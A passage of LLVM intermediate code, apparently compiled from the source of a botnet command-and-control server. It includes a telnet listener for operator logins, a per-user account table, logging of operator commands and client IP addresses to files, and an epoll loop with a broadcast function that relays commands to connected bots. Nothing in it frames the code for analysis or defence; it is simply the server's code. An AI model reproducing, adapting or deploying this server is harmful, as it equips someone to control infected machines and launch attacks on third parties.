  %465 = icmp ne i8* %464, null
  br i1 %465, label %466, label %485

466:                                              ; preds = %462
  %467 = load i32, i32* %5, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %468
  %470 = getelementptr inbounds %struct.account, %struct.account* %469, i32 0, i32 0
  %471 = getelementptr inbounds [20 x i8], [20 x i8]* %470, i64 0, i64 0
  %472 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %473 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([34 x i8], [34 x i8]* @.str.54, i64 0, i64 0), i8* noundef %471, i8* noundef %472)
  %474 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %474, %struct._IO_FILE** %36, align 8
  %475 = load %struct._IO_FILE*, %struct._IO_FILE** %36, align 8
  %476 = load i32, i32* %5, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %477
  %479 = getelementptr inbounds %struct.account, %struct.account* %478, i32 0, i32 0
  %480 = getelementptr inbounds [20 x i8], [20 x i8]* %479, i64 0, i64 0
  %481 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %482 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %475, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.56, i64 0, i64 0), i8* noundef %480, i8* noundef %481)
  %483 = load %struct._IO_FILE*, %struct._IO_FILE** %36, align 8
  %484 = call i32 @fclose(%struct._IO_FILE* noundef %483)
  br label %638

485:                                              ; preds = %462
  %486 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %487 = call i8* @strstr(i8* noundef %486, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #8
  %488 = icmp ne i8* %487, null
  br i1 %488, label %489, label %508

489:                                              ; preds = %485
  %490 = load i32, i32* %5, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %491
  %493 = getelementptr inbounds %struct.account, %struct.account* %492, i32 0, i32 0
  %494 = getelementptr inbounds [20 x i8], [20 x i8]* %493, i64 0, i64 0
  %495 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %496 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([34 x i8], [34 x i8]* @.str.54, i64 0, i64 0), i8* noundef %494, i8* noundef %495)
  %497 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %497, %struct._IO_FILE** %37, align 8
  %498 = load %struct._IO_FILE*, %struct._IO_FILE** %37, align 8
  %499 = load i32, i32* %5, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %500
  %502 = getelementptr inbounds %struct.account, %struct.account* %501, i32 0, i32 0
  %503 = getelementptr inbounds [20 x i8], [20 x i8]* %502, i64 0, i64 0
  %504 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %505 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %498, i8* noundef getelementptr inbounds ([29 x i8], [29 x i8]* @.str.56, i64 0, i64 0), i8* noundef %503, i8* noundef %504)
  %506 = load %struct._IO_FILE*, %struct._IO_FILE** %37, align 8
  %507 = call i32 @fclose(%struct._IO_FILE* noundef %506)
  br label %638

508:                                              ; preds = %485
  %509 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %510 = call i8* @strstr(i8* noundef %509, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #8
  %511 = icmp ne i8* %510, null
  br i1 %511, label %512, label %593

512:                                              ; preds = %508
  %513 = load i32, i32* %4, align 4
  %514 = call i64 @send(i32 noundef %513, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.59, i64 0, i64 0), i64 noundef 16, i32 noundef 16384)
  %515 = icmp eq i64 %514, -1
  br i1 %515, label %516, label %517

516:                                              ; preds = %512
  br label %638

517:                                              ; preds = %512
  %518 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %519 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %518, i8* noundef getelementptr inbounds ([216 x i8], [216 x i8]* @.str.27, i64 0, i64 0)) #9
  %520 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %521 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %520, i8* noundef getelementptr inbounds ([258 x i8], [258 x i8]* @.str.28, i64 0, i64 0)) #9
  %522 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %523 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %522, i8* noundef getelementptr inbounds ([240 x i8], [240 x i8]* @.str.29, i64 0, i64 0)) #9
  %524 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %525 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %524, i8* noundef getelementptr inbounds ([268 x i8], [268 x i8]* @.str.30, i64 0, i64 0)) #9
  %526 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %527 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %526, i8* noundef getelementptr inbounds ([243 x i8], [243 x i8]* @.str.31, i64 0, i64 0)) #9
  %528 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %529 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %528, i8* noundef getelementptr inbounds ([121 x i8], [121 x i8]* @.str.32, i64 0, i64 0)) #9
  %530 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %531 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %530, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i64 0, i64 0)) #9
  %532 = load i32, i32* %4, align 4
  %533 = call i64 @send(i32 noundef %532, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.25, i64 0, i64 0), i64 noundef 14, i32 noundef 16384)
  %534 = icmp eq i64 %533, -1
  br i1 %534, label %535, label %536

535:                                              ; preds = %517
  br label %638

536:                                              ; preds = %517
  %537 = load i32, i32* %4, align 4
  %538 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %539 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %540 = call i64 @strlen(i8* noundef %539) #8
  %541 = call i64 @send(i32 noundef %537, i8* noundef %538, i64 noundef %540, i32 noundef 16384)
  %542 = icmp eq i64 %541, -1
  br i1 %542, label %543, label %544

543:                                              ; preds = %536
  br label %638

544:                                              ; preds = %536
  %545 = load i32, i32* %4, align 4
  %546 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %547 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %548 = call i64 @strlen(i8* noundef %547) #8
  %549 = call i64 @send(i32 noundef %545, i8* noundef %546, i64 noundef %548, i32 noundef 16384)
  %550 = icmp eq i64 %549, -1
  br i1 %550, label %551, label %552

551:                                              ; preds = %544
  br label %638

552:                                              ; preds = %544
  %553 = load i32, i32* %4, align 4
  %554 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %555 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %556 = call i64 @strlen(i8* noundef %555) #8
  %557 = call i64 @send(i32 noundef %553, i8* noundef %554, i64 noundef %556, i32 noundef 16384)
  %558 = icmp eq i64 %557, -1
  br i1 %558, label %559, label %560

559:                                              ; preds = %552
  br label %638

560:                                              ; preds = %552
  %561 = load i32, i32* %4, align 4
  %562 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %563 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %564 = call i64 @strlen(i8* noundef %563) #8
  %565 = call i64 @send(i32 noundef %561, i8* noundef %562, i64 noundef %564, i32 noundef 16384)
  %566 = icmp eq i64 %565, -1
  br i1 %566, label %567, label %568

567:                                              ; preds = %560
  br label %638

568:                                              ; preds = %560
  %569 = load i32, i32* %4, align 4
  %570 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %571 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %572 = call i64 @strlen(i8* noundef %571) #8
  %573 = call i64 @send(i32 noundef %569, i8* noundef %570, i64 noundef %572, i32 noundef 16384)
  %574 = icmp eq i64 %573, -1
  br i1 %574, label %575, label %576

575:                                              ; preds = %568
  br label %638

576:                                              ; preds = %568
  %577 = load i32, i32* %4, align 4
  %578 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %579 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %580 = call i64 @strlen(i8* noundef %579) #8
  %581 = call i64 @send(i32 noundef %577, i8* noundef %578, i64 noundef %580, i32 noundef 16384)
  %582 = icmp eq i64 %581, -1
  br i1 %582, label %583, label %584

583:                                              ; preds = %576
  br label %638

584:                                              ; preds = %576
  %585 = load i32, i32* %4, align 4
  %586 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %587 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %588 = call i64 @strlen(i8* noundef %587) #8
  %589 = call i64 @send(i32 noundef %585, i8* noundef %586, i64 noundef %588, i32 noundef 16384)
  %590 = icmp eq i64 %589, -1
  br i1 %590, label %591, label %592

591:                                              ; preds = %584
  br label %638

592:                                              ; preds = %584
  br label %593

593:                                              ; preds = %592, %508
  %594 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %595 = call i8* @strstr(i8* noundef %594, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0)) #8
  %596 = icmp ne i8* %595, null
  br i1 %596, label %597, label %598

597:                                              ; preds = %593
  br label %638

598:                                              ; preds = %593
  %599 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* noundef %599)
  %600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %601 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %600, i8* noundef getelementptr inbounds ([45 x i8], [45 x i8]* @.str.33, i64 0, i64 0)) #9
  %602 = load i32, i32* %4, align 4
  %603 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %605 = call i64 @strlen(i8* noundef %604) #8
  %606 = call i64 @send(i32 noundef %602, i8* noundef %603, i64 noundef %605, i32 noundef 16384)
  %607 = icmp eq i64 %606, -1
  br i1 %607, label %608, label %609

608:                                              ; preds = %598
  br label %638

609:                                              ; preds = %598
  %610 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %611 = call i64 @strlen(i8* noundef %610) #8
  %612 = icmp eq i64 %611, 0
  br i1 %612, label %613, label %614

613:                                              ; preds = %609
  br label %258, !llvm.loop !19

614:                                              ; preds = %609
  %615 = load i32, i32* %5, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %616
  %618 = getelementptr inbounds %struct.account, %struct.account* %617, i32 0, i32 0
  %619 = getelementptr inbounds [20 x i8], [20 x i8]* %618, i64 0, i64 0
  %620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %621 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i64 0, i64 0), i8* noundef %619, i8* noundef %620)
  %622 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %622, %struct._IO_FILE** %38, align 8
  %623 = load %struct._IO_FILE*, %struct._IO_FILE** %38, align 8
  %624 = load i32, i32* %5, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %625
  %627 = getelementptr inbounds %struct.account, %struct.account* %626, i32 0, i32 0
  %628 = getelementptr inbounds [20 x i8], [20 x i8]* %627, i64 0, i64 0
  %629 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %630 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %623, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i64 0, i64 0), i8* noundef %628, i8* noundef %629)
  %631 = load %struct._IO_FILE*, %struct._IO_FILE** %38, align 8
  %632 = call i32 @fclose(%struct._IO_FILE* noundef %631)
  %633 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %634 = load i32, i32* %4, align 4
  %635 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  call void @broadcast(i8* noundef %633, i32 noundef %634, i8* noundef %635)
  %636 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %636, i8 0, i64 2048, i1 false)
  br label %258, !llvm.loop !19

637:                                              ; preds = %258
  br label %638

638:                                              ; preds = %637, %608, %597, %591, %583, %575, %567, %559, %551, %543, %535, %516, %489, %466, %443, %420, %397, %374, %351, %344, %336, %328, %320, %312, %304, %249, %243, %235, %227, %219, %211, %203, %195, %187, %168, %163, %156, %155, %136, %130, %104, %98, %88
  %639 = load i32, i32* %4, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %640
  %642 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %641, i32 0, i32 1
  store i32 0, i32* %642, align 4
  %643 = load i32, i32* %4, align 4
  %644 = call i32 @close(i32 noundef %643)
  %645 = load volatile i32, i32* @managesConnected, align 4
  %646 = add nsw i32 %645, -1
  store volatile i32 %646, i32* @managesConnected, align 4
  %647 = load i8*, i8** %2, align 8
  ret i8* %647
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* noundef) #3

declare i32 @fgetc(%struct._IO_FILE* noundef) #1

declare void @rewind(%struct._IO_FILE* noundef) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE* noundef, i8* noundef, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64* noundef, %union.pthread_attr_t* noundef, i8* (i8*)* noundef, i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @telnetListener(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct._IO_FILE*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %10 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #9
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  call void @perror(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.62, i64 0, i64 0))
  br label %14

14:                                               ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %2, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 noundef zeroext %20) #10
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %3, align 4
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @bind(i32 noundef %23, %struct.sockaddr* noundef %24, i32 noundef 16) #9
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %14
  call void @perror(i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.63, i64 0, i64 0))
  br label %28

28:                                               ; preds = %27, %14
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @listen(i32 noundef %29, i32 noundef 5) #9
  store i32 16, i32* %5, align 4
  br label %31

31:                                               ; preds = %68, %28
  %32 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([23 x i8], [23 x i8]* @.str.64, i64 0, i64 0))
  %33 = bitcast %struct.sockaddr_in* %7 to { i64, i64 }*
  %34 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 4
  %36 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 1
  %37 = load i64, i64* %36, align 4
  call void @client_addr(i64 %35, i64 %37)
  %38 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %8, align 8
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = and i32 %42, 255
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 65280
  %48 = lshr i32 %47, 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 16711680
  %53 = lshr i32 %52, 16
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, -16777216
  %58 = lshr i32 %57, 24
  %59 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %39, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i32 noundef %43, i32 noundef %48, i32 noundef %53, i32 noundef %58)
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %61 = call i32 @fclose(%struct._IO_FILE* noundef %60)
  %62 = load i32, i32* %3, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @accept(i32 noundef %62, %struct.sockaddr* noundef %63, i32* noundef %5)
  store i32 %64, i32* %4, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %31
  call void @perror(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.66, i64 0, i64 0))
  br label %68

68:                                               ; preds = %67, %31
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = call i32 @pthread_create(i64* noundef %9, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @telnetWorker, i8* noundef %71) #9
  br label %31
}

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare i32 @listen(i32 noundef, i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1, i8** noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %18, i8* noundef getelementptr inbounds ([39 x i8], [39 x i8]* @.str.67, i64 0, i64 0), i8* noundef %21)
  call void @exit(i32 noundef 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* noundef %26) #8
  store i32 %27, i32* %10, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* noundef %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = icmp sgt i32 %32, 850
  br i1 %33, label %34, label %36

34:                                               ; preds = %23
  %35 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.68, i64 0, i64 0))
  ret i32 0

36:                                               ; preds = %23
  %37 = load i32, i32* %9, align 4
  %38 = icmp slt i32 %37, 850
  br i1 %38, label %39, label %41

39:                                               ; preds = %36
  %40 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.69, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %36
  br label %42

42:                                               ; preds = %41
  %43 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([40 x i8], [40 x i8]* @.str.70, i64 0, i64 0))
  %44 = load i8**, i8*** %6, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @create_and_bind(i8* noundef %46)
  store volatile i32 %47, i32* @listenFD, align 4
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %42
  call void @abort() #11
  unreachable

51:                                               ; preds = %42
  %52 = load volatile i32, i32* @listenFD, align 4
  %53 = call i32 @make_socket_non_blocking(i32 noundef %52)
  store i32 %53, i32* %8, align 4
  %54 = load i32, i32* %8, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %51
  call void @abort() #11
  unreachable

57:                                               ; preds = %51
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = call i32 @listen(i32 noundef %58, i32 noundef 4096) #9
  store i32 %59, i32* %8, align 4
  %60 = load i32, i32* %8, align 4
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %62, label %63

62:                                               ; preds = %57
  call void @perror(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i64 0, i64 0))
  call void @abort() #11
  unreachable

63:                                               ; preds = %57
  %64 = call i32 @epoll_create1(i32 noundef 0) #9
  store volatile i32 %64, i32* @epollFD, align 4
  %65 = load volatile i32, i32* @epollFD, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %63
  call void @perror(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %63
  %69 = load volatile i32, i32* @listenFD, align 4
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  store i32 %69, i32* %71, align 1
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %72, align 1
  %73 = load volatile i32, i32* @epollFD, align 4
  %74 = load volatile i32, i32* @listenFD, align 4
  %75 = call i32 @epoll_ctl(i32 noundef %73, i32 noundef 1, i32 noundef %74, %struct.epoll_event* noundef %11) #9
  store i32 %75, i32* %8, align 4
  %76 = load i32, i32* %8, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

78:                                               ; preds = %68
  call void @perror(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  call void @abort() #11
  unreachable

79:                                               ; preds = %68
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, 2
  %82 = zext i32 %81 to i64
  %83 = call i8* @llvm.stacksave()
  store i8* %83, i8** %12, align 8
  %84 = alloca i64, i64 %82, align 16
  store i64 %82, i64* %13, align 8
  br label %85

85:                                               ; preds = %89, %79
  %86 = load i32, i32* %9, align 4
  %87 = add nsw i32 %86, -1
  store i32 %87, i32* %9, align 4
  %88 = icmp ne i32 %86, 0
  br i1 %88, label %89, label %95

89:                                               ; preds = %85
  %90 = load i32, i32* %9, align 4
  %91 = add nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i64, i64* %84, i64 %92
  %94 = call i32 @pthread_create(i64* noundef %93, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @epollEventLoop, i8* noundef null) #9
  br label %85, !llvm.loop !20

95:                                               ; preds = %85
  %96 = getelementptr inbounds i64, i64* %84, i64 0
  %97 = load i32, i32* %10, align 4
  %98 = sext i32 %97 to i64
  %99 = inttoptr i64 %98 to i8*
  %100 = call i32 @pthread_create(i64* noundef %96, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* noundef %99) #9
  br label %101

101:                                              ; preds = %102, %95
  br label %102

102:                                              ; preds = %101
  call void @broadcast(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 noundef -1, i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i64 0, i64 0))
  %103 = call i32 @sleep(i32 noundef 60)
  br label %101
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @create_and_bind(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* noundef null, i8* noundef %14, %struct.addrinfo* noundef %4, %struct.addrinfo** noundef %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
